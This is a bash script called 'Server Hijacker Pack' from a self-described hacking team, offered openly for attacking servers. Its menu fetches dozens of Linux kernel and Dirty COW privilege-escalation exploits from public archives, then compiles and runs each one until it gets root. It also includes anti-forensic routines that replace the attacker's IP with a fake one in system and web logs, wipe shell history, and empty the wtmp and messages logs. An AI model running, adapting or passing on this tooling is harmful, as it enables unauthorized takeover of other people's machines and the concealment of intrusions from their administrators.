#
#-------------
# This is Copyright Line Dont Remove If You Real Man
# This Code Not Really Pure a few part of code here 
# is development from another code but the idea and algorithm is pure 
# made by me
# If You Wanna Recode This Dont Forget To Put The Source 
#------------- 
# Name : Server Hijacker Pack 
# Version : 1.0
# Author : Yukinoshita 47
# Team : Garuda Security Hacker
#-------------
# 
#
#!/bin/bash
lagi='y'
while  [ $lagi == 'y' ] || [ $lagi == 'Y' ];
do
   clear
   echo "  _______  _______            "
   echo " (  ____ \(  ____ \|\     /|  "
   echo " | (    \/| (    \/| )   ( | We Are Not"
   echo " | |      | (_____ | (___) | Undergroud Anymore "
   echo " | | ____ (_____  )|  ___  | We Are A Simple Team "
   echo " | | \_  )      ) || (   ) | And Off Course "
   echo " | (___) |/\____) || )   ( | No Army Can Stop Our Idea "
   echo " (_______)\_______)|/     \|  "
   echo ""                        
   echo -e "\e[31m====================================================";
   echo ""
   echo -e "\e[92m  Garuda Security Hacker - The Coders Team"
   echo "         Server Hijacker Pack v.1.0" 
   echo "         Coded by Yukinoshita 47"
   echo ""
   echo -e "\e[31m====================================================";
   echo ""
   echo -e "\e[34m 1. Auto R00ting \e[33m[Hijack With Kernel Exploit]";
   echo -e "\e[34m 2. Auto R00t Dirty Cow Exploit \e[33m[Same As Number 1]";
   echo -e "\e[34m 3. Anti Logging \e[33m[Log Manipulation]"
   echo -e "\e[34m 4. Log Eraser \e[33m[Cleaning Log For Hide Your Ass]";
   echo -e "\e[34m 5. Exit \e[33m[Run From Admin And Police :p]     ";
   echo ""
   echo  -e "\e[31m===================================================";
   read -p " Your Choice [1-4] :" pil;
   echo "===================================================";
case $pil in 1)
#All exploits are suggested by "Linux Exploit Suggester" and will update according to it.
#Name     : Auto Root
#Author   : Nilotpal Biswas
#Facebook : https://www.facebook.com/nilotpal.biswas.73
#Twitter  : https://twitter.com/nilotpalhacker
#USAGE    : bash autoroot.sh
echo "==================================================="
echo "              Auto Root Exploit v. 2.0"
echo "             Algorithm by Nilotpal Biswas"
echo "            Developed and Update Exploit by"
echo "                   Yukinoshita 47"
echo "==================================================="

checkroot() {
if [ $(id -u) == 0 ]; then
echo
echo "Successfully R00T(ed).. have fun :)"
id=$(id)
echo "ID     => " $id
who=$(whoami)
echo "WHOAMI => " $who
exit
else
echo ""
echo "R00Ting.. wait"
sleep 1
fi
}
echo "Auto R00Ting start..."
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/744.c -O exploit.c
gcc -O2 -fomit-frame-pointer exploit.c -o exploit
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/2013.c -O exploit.c
gcc exploit.c -o exploit
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/1397.c -O exploit.c
gcc -o exploit exploit.c -static -O2
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/160.c -O exploit.c
gcc -O3 -static -fomit-frame-pointer exploit.c -o exploit
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/15023.c -O exploit.c
gcc exploit.c -o exploit
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/2031.c -O exploit.c
gcc exploit.c -o exploit -static -Wall
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/2004.c -O exploit.c
gcc exploit.c -o exploit
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/2005.c -O exploit.c
gcc exploit.c -o exploit
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/2006.c -O exploit.c
gcc exploit.c -o exploit -Wall
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/5092.c -O exploit.c
gcc exploit.c -o exploit &  gcc exploit.c -o exploit -static -Wno-format
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/5093.c -O exploit.c
gcc exploit.c -o exploit
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/6851.c -O exploit.c
gcc exploit.c -o exploit
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/14814.c -O exploit.c
gcc exploit.c -o exploit
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/15285.c -O exploit.c
gcc exploit.c -o exploit
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/6851.c -O exploit.c
gcc exploit.c -o exploit
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/17787.c -O exploit.c
gcc exploit.c -o exploit -lrt
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/15916.c -O exploit.c
gcc -w exploit.c -o exploit
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/15150.c -O exploit.c
gcc exploit.c -o exploit
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/15024.c -O exploit.c
gcc exploit.c -o exploit
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/18411.c -O exploit.c
gcc exploit.c -o exploit
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/25444.c -O exploit.c
gcc -O2 exploit.c
./a.out
rm a.out && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/26131.c -O exploit.c
gcc exploit.c -o exploit
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/lin_amd64/local/27297.c -O exploit.c
gcc exploit.c -o exploit
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/31346.c -O exploit.c
gcc exploit.c -o exploit
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/2011.sh -O exploit.sh
bash exploit.sh
rm exploit.sh && rm *.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/8369.sh -O exploit.sh
bash exploit.sh
rm exploit.sh && rm *.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/8478.sh -O exploit.sh
bash exploit.sh
rm exploit.sh && rm exploit.c
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/12130.py -O exploit.py
python exploit.py
rm exploit.py && rm *.c
checkroot;

wget --no-check-certificate https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/9436.tgz
tar -xvf 9436.tgz
bash run.sh
rm run.sh && rm run.c && rm exploit.c && rm 9436.tgz
checkroot;

wget --no-check-certificate https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/9435.tgz
tar -xvf 9435.tgz
cd wunderbar_emporium/
bash wunderbar_emporium.sh
cd ..
rm wunderbar_emporium & rm 9435.tgz
checkroot;

wget http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c -O exploit.c
gcc exploit.c -lutil -lpthread
./a.out
rm a.out && rm exploit.c
checkroot;

echo
echo "Srry..:( I tried hard, but no luck this time.. Wait for update"


;;
2)
#Auto Root Dirty Cow Exploit
#Made by Yukinoshita 47
echo "==================================================="
echo "         Auto Root Dirty Cow Exploit v. 1.0"
echo "                    Created By"
echo "                  Yukinoshita 47"
echo "==================================================="

checkroot() {
if [ $(id -u) == 0 ]; then
echo
echo "Successfully R00T(ed).. have fun Dont Forget To Smile :)"
id=$(id)
echo "ID     => " $id
who=$(whoami)
echo "WHOAMI => " $who
exit
else
echo ""
echo "R00Ting.. wait"
sleep 1
fi
}
echo "Auto R00Ting start..."
checkroot;

wget --no-check-certificate https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c -O exploit.c
gcc exploit.c -o exploit
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://gist.githubusercontent.com/KrE80r/42f8629577db95782d5e4f609f437a54/raw/71c902f55c09aa8ced351690e1e627363c231b45/c0w.c -O exploit.c
gcc exploit.c -o exploit
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://gist.githubusercontent.com/mak/c36136ccdbebf5ecfefd80c0f2ed6747/raw/9c35b0f1911c0476e794c24ddddc67653dbfdba2/naughtyc0w.c -O exploit.c
gcc exploit.c -o exploit
./exploit
rm exploit && rm exploit.c
checkroot;

wget --no-check-certificate https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c -O exploit.c
gcc exploit.c -o exploit
./exploit
rm exploit && rm exploit.c
checkroot;

echo
echo "Sorry..:( Not Vulnerable Maybe This Server Has Been Patched :("
;;
3)
#!/bin/bash
#
# Guru-Antilog V 0.1
#
# usage : to Exchanging your IP with fake IP y0 choose it
#
# and to clear your last command's and clear logout history  
#
# Remember that...
#
# y0 have one minute to logout from b0x no more.. so be carefull
# 
# Fuck the whitehats 
# 
clear
echo "-   -------------------------------------------------------------"
echo " Guru-Antilog c0ded  By [ sAFA7_eLNeT ]" 
echo " (SecurityGurus.NeT) - SecurityGurus[AT]irc.dal.net:6667 "
echo " Greetz g0es to : Acid-WarZ,rOCk-MaStEr, Yukinoshita 47"
echo "                  j7a,MedoZero,Spiderz,and all SecurityGurus.NeT PPL" 
echo "                  and all 1--5.com folks "
echo "-----------------------------------------------------------------"
if [ "$UID" = "0" ];then
echo " h3re w3 g0 "
else
echo " `whoami` y0 must be login by root"
fi
echo -n " What's the ip y0 want to spoof it ?  "
read word
word=$word
echo -n " What's the Fake ip y0 want  using it ? "
read fake
fake=$fake
r0x="yes"
if [ ! -f /var/log/lastlog ]; then
r0x="no"
echo " i can't find lastlog"
fi
if [ "$r0x" = "yes" ]; then
echo " Editing lastlog"
sed "s/$word/$fake/g" /var/log/lastlog > /var/log/lastlog.new
mv /var/log/lastlog.new /var/log/lastlog
fi
syslog="yes"
if [ ! -f /var/log/syslog ]; then
echo " i can't find syslog"
 syslog="no"
fi
if [ "$syslog" = "yes" ]; then
echo " Editing syslog"
sed "s/$word/$fake/g" /var/log/syslog > /var/log/syslog.new
mv /var/log/syslog.new /var/log/syslog
fi
mess="yes"
if [ ! -f /var/log/messages ]; then
 echo " i can't find message "
mess="no"
fi
if [ "$mess" = "yes" ]; then
echo " Editing message"
sed "s/$word/$fake/g" /var/log/messages > /var/log/messages.new
mv /var/log/messages.new /var/log/messages
fi
http="yes"
if [ ! -f /var/log/httpd/access_log ]; then
 echo " i can't find access_log "
http="no"
fi
if [ "$http" = "yes" ]; then
 echo " Editing access_log"
sed "s/$word/$fake/g" /var/log/httpd/access_log > /var/log/httpd/access_log.new
mv /var/log/httpd/access_log.new /var/log/httpd/access_log
fi
httpd="yes"
if [ ! -f /var/log/httpd/error_log ]; then
 echo " i can't find error_log "
httpd="no"
fi
if [ "$httpd" = "yes" ]; then
echo " Editing error_log "
sed "s/$word/$fake/g" /var/log/httpd/error_log > /var/log/httpd/error_log.new
mv /var/log/httpd/error_log.new /var/log/httpd/error_log
fi
wtmp="yes"
if [ ! -f /var/log/wtmp ]; then
 echo " i can't find wtmp "
wtmp="no"
fi
if [ "$wtmp" = "yes" ]; then
echo " Editing wtmp "
sed "s/$word/$fake/g" /var/log/wtmp > /var/log/wtmp.new
mv /var/log/wtmp.new /var/log/wtmp
fi
secure="yes"
if [ ! -f /var/log/secure ]; then
echo " i can't find secure "
secure="no"
fi
if [ "$secure" = "yes" ]; then
echo " Editing secure "
sed "s/$word/$fake/g" /var/log/secure > /var/log/secure.new
mv /var/log/secure.new /var/log/secure
fi
xferlog="yes"
if [ ! -f /var/log/xferlog ]; then
echo " i can't find xferlog "
xferlog="no"
fi
if [ "$xferlog" = "yes" ]; then
echo " Editing xferlog "
sed "s/$word/$fake/g" /var/log/xferlog > /var/log/xferlog.new
mv /var/log/xferlog.new /var/log/xferlog
fi
utmp="yes"
if [ ! -f /var/run/utmp ]; then
echo " i can't find utmp "
utmp="no"
fi
if [ "$utmp" = "yes" ]; then
echo " Editing utmp "
sed "s/$word/$fake/g" /var/run/utmp > /var/run/utmp.new
mv /var/run/utmp.new /var/run/utmp
fi
echo -n " if y0 want to delete the last commands  type (yes) if y0 don't type (no) 0r anything    "
read command
if [ "$command" = "yes" ]; then
echo "##Now the last commands y0 put it will go to hell ^_^ ##"
echo -n > ~/.bash_history
history -c
echo -n " y0 have one minute to exit from server..go0d luck "
/etc/init.d/atd start
echo "sed 's/$word/$fake/g' /var/run/utmp > /var/run/utmp.new" | at now + 1 minute
echo "mv /var/run/utmp.new /var/run/utmp" | at now + 2 minute
echo " Guru-Antilog Ended  work... Cheers ! "
exit 0
else
echo -n " y0 have one minute to exit from server..go0d luck "
/etc/init.d/atd start
echo "sed 's/$word/$fake/g' /var/run/utmp > /var/run/utmp.new" | at now + 1 minute
echo "mv /var/run/utmp.new /var/run/utmp" | at now + 2 minute
echo " Guru-Antilog Ended  work... Cheers ! "
exit 0
fi


;;
4)
# Name: Zheng Hao Tan
# Email: tanzhao@umich.edu
# Date: June 26, 2014
# This shell script will clean up the log files in your system.
#!/bin/bash
# chmod u+rx <script name>
LOG_DIR=/var/log
cd $LOG_DIR
# Perform clean up.
cat /dev/null > messages
cat /dev/null > wtmp
echo "The logs have been cleaned up!"
# EOF.

;;
5)
       exit 0
;;
*)
       echo "Sorry, Not Available"
       exit 1
;;
esac
echo -n "Back To Main Menu(y/n) :";
read lagi;
done
